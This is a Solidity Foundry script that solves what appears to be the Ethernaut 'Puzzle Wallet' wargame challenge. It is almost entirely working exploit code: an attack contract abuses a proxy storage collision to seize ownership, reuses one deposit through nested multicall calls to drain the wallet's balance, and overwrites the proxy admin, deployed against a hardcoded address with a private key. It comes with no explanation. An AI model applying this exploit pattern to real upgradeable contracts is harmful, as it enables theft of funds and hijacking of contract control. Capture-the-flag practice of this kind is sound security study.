// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level24.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {
    PuzzleProxy public puzzleProxy;
    PuzzleWallet public puzzleWallet;
    constructor(address _target) payable {
        puzzleProxy = PuzzleProxy(payable(_target));
        puzzleWallet = PuzzleWallet(_target);
    }

    function gogo() external {
        bytes memory newAdminData = abi.encodeWithSelector(
            puzzleProxy.proposeNewAdmin.selector,
            address(this)
        );
        bytes memory addToWhitelistData = abi.encodeWithSelector(
            puzzleWallet.addToWhitelist.selector,
            address(this)
        );

        (bool success1, ) = address(puzzleProxy).call{value: 0 ether}(
            newAdminData
        );
        require(success1, "newAdminData fail");
        (bool success2, ) = address(puzzleProxy).call{value: 0 ether}(
            addToWhitelistData
        );
        require(success2, "addToWhitelistData fail");

        bytes[] memory hackData = new bytes[](3);

        bytes memory depositData = abi.encodeWithSelector(
            puzzleWallet.deposit.selector
        );

        bytes[] memory innerData = new bytes[](1);
        innerData[0] = depositData;

        bytes memory MulticallData1 = abi.encodeWithSelector(
            puzzleWallet.multicall.selector,
            innerData
        );

        bytes memory gogoVul = abi.encodeWithSelector(
            puzzleWallet.execute.selector,
            address(this),
            0.001 ether,
            ""
        );

        hackData[0] = depositData;
        hackData[1] = MulticallData1;
        hackData[2] = gogoVul;

        bytes memory pushhackData = abi.encodeWithSelector(
            puzzleWallet.multicall.selector,
            hackData
        );

        (bool success3, ) = address(puzzleProxy).call{value: 0.001 ether}(
            pushhackData
        );
        require(success3, "addToWhitelistData fail");

        bytes memory setMaxBalanceData = abi.encodeWithSelector(
            puzzleWallet.setMaxBalance.selector,
            0
        );
        (bool success4, ) = address(puzzleProxy).call{value: 0 ether}(
            setMaxBalanceData
        );
        require(success4, "setMaxBalanceData fail");

        bytes memory initData = abi.encodeWithSelector(
            puzzleWallet.init.selector,
            0
        );
        (bool success5, ) = address(puzzleProxy).call{value: 0 ether}(initData);
        require(success5, "setMaxBalanceData fail");

        bytes[] memory LastcallData = new bytes[](1);
        bytes memory initData2 = abi.encodeWithSelector(
            puzzleWallet.init.selector,
            0xBD008DB3d8704Ce124fcd13E448E950B409e07E1
        );
        LastcallData[0] = initData2;
        bytes memory MulticallLastcall = abi.encodeWithSelector(
            puzzleWallet.multicall.selector,
            LastcallData
        );
        (bool success6, ) = address(puzzleProxy).call{value: 0 ether}(
            MulticallLastcall
        );
        require(success6, "setMaxBalanceData fail");
    }

    receive() external payable {
        console.log("received", msg.value);
    }
}

contract PuzzleWalletSolution is Script {
    PuzzleWallet public puzzleWallet =
        PuzzleWallet(payable(0x647f11a425C2ef864955Ea26D0e9cE5c3936A86f));
    PuzzleProxy public puzzleProxy =
        PuzzleProxy(payable(0x647f11a425C2ef864955Ea26D0e9cE5c3936A86f));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("in script owner", puzzleWallet.owner());

        Attack attack = new Attack{value: 0.001 ether}(address(puzzleProxy));
        attack.gogo();

        console.log("ADMIN", puzzleProxy.admin());

        vm.stopBroadcast();
    }
}
